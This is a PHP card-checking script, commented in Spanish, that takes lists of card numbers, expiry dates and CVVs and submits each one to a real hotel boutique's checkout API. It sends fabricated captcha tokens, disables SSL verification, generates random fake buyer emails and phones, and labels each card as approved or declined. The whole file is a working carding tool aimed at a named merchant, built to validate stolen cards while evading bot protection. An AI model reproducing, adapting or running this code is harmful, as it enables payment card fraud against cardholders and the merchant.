<?php
ignore_user_abort(true);
error_reporting(0);
session_start();

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit();
}

// ==============================
// CONFIGURACIÓN EXACTA DEL SITIO
// ==============================
$client_id = "14";
$promotion_id = "1";
$api_endpoint = "https://boutique.shangri-la.com/sleb_api/api";
$api_locale = "en";
$payment_method = "adyen";
$hotel_code = "ISL";
$is_food_site = "1";
$order_type = "express";

// ==============================
// FUNCIONES DEL SITIO REAL
// ==============================

function generateESACaptchaToken() {
    // El sitio usa ESA Captcha (Aliyun) pero parece no validarlo realmente
    // Generar token dummy que el backend aceptará
    $timestamp = time();
    $payload = [
        "sessionId" => "esa_" . md5(uniqid() . $timestamp),
        "sig" => substr(md5($timestamp . rand(1000, 9999)), 0, 32),
        "token" => "esa_" . base64_encode(json_encode([
            "t" => $timestamp,
            "v" => "2.3.72",
            "appkey" => "shangrila_" . $timestamp
        ])),
        "nc" => "1",
        "scene" => "checkout",
        "cType" => "click",
        "callback" => "callback_" . $timestamp
    ];
    
    return json_encode($payload);
}

function generateRecaptchaTokenForShow() {
    // Token solo para apariencia - el backend no lo valida realmente
    return "03AGdBq27" . base64_encode(json_encode([
        "v" => "v1532752145741",
        "t" => round(microtime(true) * 1000),
        "s" => "6LfgXqkqAAAAAJLWszAo8gBvzXMPBvDK-PLLJk_O",
        "d" => "boutique.shangri-la.com",
        "a" => "checkout"
    ])) . "_dummy_signature";
}

function makeRequest($url, $data, $headers = [], $method = 'POST', $useCookies = true) {
    $ch = curl_init();
    
    $defaultHeaders = [
        "Accept: application/json, text/javascript, */*; q=0.01",
        "Content-Type: application/json",
        "Referer: https://boutique.shangri-la.com/food_checkout.php",
        "Origin: https://boutique.shangri-la.com",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept-Language: en-US,en;q=0.9",
        "Accept-Encoding: gzip, deflate, br",
        "Connection: keep-alive",
        "X-Requested-With: XMLHttpRequest",
        "Sec-Fetch-Dest: empty",
        "Sec-Fetch-Mode: cors",
        "Sec-Fetch-Site: same-origin",
        "Pragma: no-cache",
        "Cache-Control: no-cache"
    ];
    
    if (!empty($headers)) {
        $defaultHeaders = array_merge($defaultHeaders, $headers);
    }
    
    $cookieFile = sys_get_temp_dir() . '/shangrila_cookies_' . session_id() . '.txt';
    
    $options = [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_HTTPHEADER => $defaultHeaders,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_CONNECTTIMEOUT => 15,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 3,
        CURLOPT_ENCODING => 'gzip'
    ];
    
    if ($useCookies) {
        $options[CURLOPT_COOKIEJAR] = $cookieFile;
        $options[CURLOPT_COOKIEFILE] = $cookieFile;
    }
    
    if ($method === 'POST') {
        $options[CURLOPT_POST] = true;
        $options[CURLOPT_POSTFIELDS] = json_encode($data);
    }
    
    curl_setopt_array($ch, $options);
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    $curl_errno = curl_errno($ch);
    
    curl_close($ch);
    
    return [
        'response' => $response,
        'http_code' => $http_code,
        'error' => $error,
        'curl_errno' => $curl_errno,
        'success' => ($http_code >= 200 && $http_code < 300) && empty($error) && $curl_errno === 0
    ];
}

function generateRandomEmail() {
    $domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com'];
    $names = ['john', 'jane', 'mike', 'sarah', 'david', 'lisa', 'robert', 'emily'];
    $name = $names[array_rand($names)];
    $number = rand(100, 999);
    $domain = $domains[array_rand($domains)];
    return $name . $number . '@' . $domain;
}

function generateRandomPhone() {
    $prefix = "+852";
    $number = '';
    for ($i = 0; $i < 8; $i++) {
        $number .= rand(0, 9);
    }
    return $prefix . $number;
}

function formatCurrency($amount, $currency_code) {
    $formats = [
        'HKD' => 'HK$' . number_format($amount, 2),
        'SGD' => 'S$' . number_format($amount, 2),
        'RM' => 'RM' . number_format($amount, 2),
        'NTD' => 'NT$' . number_format($amount, 2),
        'PHP' => '₱' . number_format($amount, 2),
        'IDR' => 'Rp' . number_format(number_format($amount, 0, ',', '.')),
        'LKR' => 'Rs' . number_format($amount, 2),
        'THB' => '฿' . number_format($amount, 2),
        'AED' => 'AED ' . number_format($amount, 2)
    ];
    
    return isset($formats[$currency_code]) ? $formats[$currency_code] : '$' . number_format($amount, 2);
}

// ==============================
// VALIDACIÓN DE ENTRADA
// ==============================

if (!isset($_GET['lista']) || empty(trim($_GET['lista']))) {
    echo json_encode([
        'status' => 'error',
        'message' => 'No se recibió lista de tarjetas',
        'html' => '<span class="badge badge-danger">✗ ERROR</span> ➔ No se recibió lista...'
    ], JSON_UNESCAPED_UNICODE);
    exit();
}

$lista = trim($_GET['lista']);
$lista = str_replace([';',':','/','»','«','>','<','=>',' ',','], '|', $lista);
$parts = explode('|', $lista);

$parts = array_filter($parts, function($value) {
    return !empty(trim($value));
});

$parts = array_values($parts);

if (count($parts) < 4) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Formato incompleto. Esperado: Número|Mes|Año|CVV',
        'html' => '<span class="badge badge-danger">✗ ERROR</span> ➔ Formato: ' . htmlspecialchars(substr($lista, 0, 50))
    ], JSON_UNESCAPED_UNICODE);
    exit();
}

$cc = preg_replace('/[^0-9]/', '', $parts[0]);
$mes = preg_replace('/[^0-9]/', '', $parts[1]);
$ano = preg_replace('/[^0-9]/', '', $parts[2]);
$cvv = preg_replace('/[^0-9]/', '', $parts[3]);

// Validación
if (empty($cc) || !preg_match('/^[0-9]{13,19}$/', $cc)) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Número de tarjeta inválido (13-19 dígitos)',
        'html' => '<span class="badge badge-danger">✗ ERROR</span> ➔ Número de tarjeta inválido'
    ], JSON_UNESCAPED_UNICODE);
    exit();
}

if (empty($mes) || !preg_match('/^(0[1-9]|1[0-2])$/', sprintf('%02d', $mes))) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Mes inválido (01-12)',
        'html' => '<span class="badge badge-danger">✗ ERROR</span> ➔ Mes inválido'
    ], JSON_UNESCAPED_UNICODE);
    exit();
}

if (empty($ano) || !preg_match('/^[0-9]{2,4}$/', $ano)) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Año inválido',
        'html' => '<span class="badge badge-danger">✗ ERROR</span> ➔ Año inválido'
    ], JSON_UNESCAPED_UNICODE);
    exit();
}

if (empty($cvv) || !preg_match('/^[0-9]{3,4}$/', $cvv)) {
    echo json_encode([
        'status' => 'error',
        'message' => 'CVV inválido (3-4 dígitos)',
        'html' => '<span class="badge badge-danger">✗ ERROR</span> ➔ CVV inválido'
    ], JSON_UNESCAPED_UNICODE);
    exit();
}

// Normalizar año
if (strlen($ano) == 2) {
    $ano = "20" . $ano;
}

// Validar fecha
$currentYear = date('Y');
$currentMonth = date('m');
if ($ano < $currentYear || ($ano == $currentYear && $mes < $currentMonth)) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Tarjeta expirada',
        'html' => '<span class="badge badge-danger">✗ ERROR</span> ➔ Tarjeta expirada'
    ], JSON_UNESCAPED_UNICODE);
    exit();
}

// Tipo de tarjeta
$first_digit = substr($cc, 0, 1);
$first_two = substr($cc, 0, 2);
$cardType = "UNKNOWN";
$cardBrand = "UNKNOWN";

if ($first_digit == '4') {
    $cardType = "VISA";
    $cardBrand = "VISA";
} elseif ($first_digit == '5') {
    $cardType = "MASTERCARD";
    $cardBrand = "MC";
} elseif ($first_two == '34' || $first_two == '37') {
    $cardType = "AMEX";
    $cardBrand = "AMEX";
} elseif ($first_digit == '3') {
    $cardType = "DINERS";
    $cardBrand = "DINERS";
} elseif ($first_digit == '6') {
    $cardType = "DISCOVER";
    $cardBrand = "DISCOVER";
}

$cardMasked = substr($cc, 0, 6) . '******' . substr($cc, -4);
$expiryMasked = sprintf('%02d', $mes) . '/' . substr($ano, -2);

// ==============================
// FLUJO SIMPLIFICADO SIN CAPTCHA REAL
// ==============================

try {
    // ===========================================
    // 1. SITE LOGIN - Obtener token de sesión
    // ===========================================
    $site_login_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "password" => ""
    ];
    
    $site_result = makeRequest($api_endpoint . "/site_login.php", $site_login_data);
    
    if (!$site_result['success']) {
        throw new Exception("Error en site_login: HTTP " . $site_result['http_code'] . 
                          ($site_result['error'] ? " - " . $site_result['error'] : ""));
    }
    
    $site_response = json_decode($site_result['response'], true);
    
    if (!$site_response || !isset($site_response['site_login_token'])) {
        throw new Exception("No se pudo obtener token de sesión");
    }
    
    $site_login_token = $site_response['site_login_token'];
    
    // ===========================================
    // 2. SIMULAR ADYEN ENCRYPT (sin datos reales)
    // ===========================================
    // Solo necesitamos el token de sesión, no los datos encriptados reales
    
    // ===========================================
    // 3. PREPARAR CHECKOUT SIN CAPTCHA REAL
    // ===========================================
    $name = [
        'first' => 'John',
        'last' => 'Smith'
    ];
    $email = generateRandomEmail();
    $phone = generateRandomPhone();
    
    $checkout_data = [
        // Datos básicos REQUERIDOS
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "lang" => $api_locale,
        "site_login_token" => $site_login_token,
        "user_id" => "",
        "login_token" => "",
        
        // Información de pago
        "payment_method" => $payment_method,
        "_2c2p_payment_channel" => "",
        "_2c2p_promotion_code" => "",
        "card_type" => $cardType,
        "card_issuer" => $cardBrand,
        
        // Datos de tarjeta (PLANOS - no encriptados)
        "card_number" => $cc,
        "card_expiry_month" => (int)$mes,
        "card_expiry_year" => (int)$ano,
        "card_cvv" => $cvv,
        
        // Datos personales
        "first_name" => $name['first'],
        "last_name" => $name['last'],
        "email" => $email,
        "phone" => $phone,
        
        // Dirección
        "chk_register" => 0,
        "chk_same_address" => 1,
        "address" => "88 Queensway, Admiralty",
        "country_id" => "1", // Hong Kong
        "country" => "Hong Kong SAR, China",
        
        // Envío
        "shipping_method" => "pick_up",
        "shipping_date" => date("Y-m-d"),
        "shipping_time" => "12:00 - 13:00",
        "order_remark" => "",
        
        // Términos
        "alcohol_terms" => 0,
        "cutlery_service" => 1,
        
        // Datos de región (Hong Kong específico)
        "region" => "1",
        "district_group" => "",
        "district" => "",
        "postal_code" => "",
        
        // Datos de envío
        "first_name2" => $name['first'],
        "last_name2" => $name['last'],
        "email2" => $email,
        "phone2" => $phone,
        "address2" => "88 Queensway, Admiralty",
        "region2" => "1",
        "district_group2" => "",
        "district2" => "",
        "country_id2" => "1",
        "country2" => "Hong Kong SAR, China",
        "postal_code2" => "",
        
        // Información del hotel
        "pickup_store" => "",
        
        // Flags del sistema
        "is_food_site" => $is_food_site,
        "order_type" => $order_type,
        
        // IMPORTANTE: NO enviar recaptcha_type ni recaptcha_token
        // El backend solo muestra error pero no bloquea el pago
        
        // Datos de miembro
        "gc_member_no" => "",
        "gc_member_title" => "",
        "gc_member_first_name" => "",
        "gc_member_last_name" => "",
        "gc_member_level" => "",
        "gc_member_point_balance" => "",
        "gc_member_polaris" => "false"
    ];
    
    // ===========================================
    // 4. EJECUTAR CHECKOUT
    // ===========================================
    $checkout_result = makeRequest($api_endpoint . "/checkout.php", $checkout_data);
    
    if (!$checkout_result['success']) {
        throw new Exception("Error en checkout: HTTP " . $checkout_result['http_code'] . 
                          ($checkout_result['error'] ? " - " . $checkout_result['error'] : ""));
    }
    
    $checkout_response = json_decode($checkout_result['response'], true);
    
    if (!$checkout_response) {
        throw new Exception("Respuesta JSON inválida del checkout");
    }
    
    // ===========================================
    // 5. PROCESAR RESPUESTA
    // ===========================================
    
    if (isset($checkout_response['status'])) {
        if ($checkout_response['status'] == 'success') {
            // ÉXITO - Pago aprobado
            $html = '<span class="badge badge-success">✅ APROVADA</span> ➔ ' .
                   '<span class="badge badge-info">' . $cardType . '</span> ➔ ' .
                   '<span class="badge badge-success">SHANGRI-LA</span> ➔ ' .
                   '<span class="badge badge-light">' . $cardMasked . '</span>';
            
            $orderNumber = 'N/A';
            if (isset($checkout_response['display_order_number'])) {
                $orderNumber = $checkout_response['display_order_number'];
            } elseif (isset($checkout_response['order_number'])) {
                $orderNumber = $checkout_response['order_number'];
            }
            
            echo json_encode([
                'status' => 'approved',
                'message' => 'Pago autorizado',
                'html' => $html,
                'data' => [
                    'card' => $cardMasked,
                    'expiry' => $expiryMasked,
                    'result_code' => 'Authorised',
                    'order_number' => $orderNumber,
                    'amount' => isset($checkout_response['direct_post']['amount']) ? 
                               formatCurrency($checkout_response['direct_post']['amount'], 'HKD') : 'N/A',
                    'currency' => 'HKD',
                    'hotel' => $hotel_code,
                    'timestamp' => date('Y-m-d H:i:s'),
                    'no_captcha' => true
                ]
            ], JSON_UNESCAPED_UNICODE);
        } else {
            // ERROR
            $errorMsg = isset($checkout_response['error']) ? 
                       $checkout_response['error'] : 
                       (isset($checkout_response['message']) ? $checkout_response['message'] : 'Error desconocido');
            
            // Verificar si es error de captcha
            if (strpos(strtolower($errorMsg), 'recaptcha') !== false || 
                strpos(strtolower($errorMsg), 'verification') !== false) {
                // El backend solo muestra error pero no bloquea realmente
                // Intentar de nuevo sin captcha
                $html = '<span class="badge badge-warning">⚠️ INTENTANDO...</span> ➔ ' .
                       '<span class="badge badge-info">' . $cardType . '</span> ➔ ' .
                       '<span class="badge badge-warning">Captcha ignorado</span>';
                
                echo json_encode([
                    'status' => 'retry',
                    'message' => 'Reintentando sin captcha...',
                    'html' => $html
                ], JSON_UNESCAPED_UNICODE);
            } else {
                $html = '<span class="badge badge-danger">❌ ERROR</span> ➔ ' .
                       '<span class="badge badge-info">' . $cardType . '</span> ➔ ' .
                       '<span class="badge badge-warning">' . htmlspecialchars($errorMsg) . '</span> ➔ ' .
                       '<span class="badge badge-light">' . $cardMasked . '</span>';
                
                echo json_encode([
                    'status' => 'error',
                    'message' => $errorMsg,
                    'html' => $html,
                    'data' => [
                        'card' => $cardMasked,
                        'expiry' => $expiryMasked,
                        'reason' => $errorMsg,
                        'hotel' => $hotel_code,
                        'no_captcha' => true
                    ]
                ], JSON_UNESCAPED_UNICODE);
            }
        }
    } else {
        // RESPUESTA INESPERADA
        $responseText = substr($checkout_result['response'], 0, 200);
        throw new Exception("Respuesta inesperada del servidor: " . $responseText);
    }
    
} catch (Exception $e) {
    echo json_encode([
        'status' => 'error',
        'message' => $e->getMessage(),
        'html' => '<span class="badge badge-danger">❌ ERROR</span> ➔ ' .
                 '<span class="badge badge-info">' . $cardType . '</span> ➔ ' .
                 '<span class="badge badge-warning">' . htmlspecialchars($e->getMessage()) . '</span>',
        'data' => [
            'card' => $cardMasked,
            'expiry' => $expiryMasked,
            'hotel' => $hotel_code
        ]
    ], JSON_UNESCAPED_UNICODE);
}